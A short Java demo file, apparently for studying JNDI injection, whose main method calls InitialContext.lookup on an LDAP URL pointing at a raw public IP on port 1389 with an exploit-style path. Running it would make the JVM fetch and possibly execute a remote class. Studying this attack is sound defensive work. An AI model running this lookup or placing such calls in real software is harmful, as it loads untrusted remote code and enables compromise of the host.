package org.example.jndidemo;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JndiDemo {
    public static void main(String[] args) throws NamingException {
        //创建一个rmi ldap等服务调用
        InitialContext ini = new InitialContext();
        //调用rmi ldap等服务对象类
        ini.lookup("ldap://121.41.34.25:1389/nny6fz");
    }
}
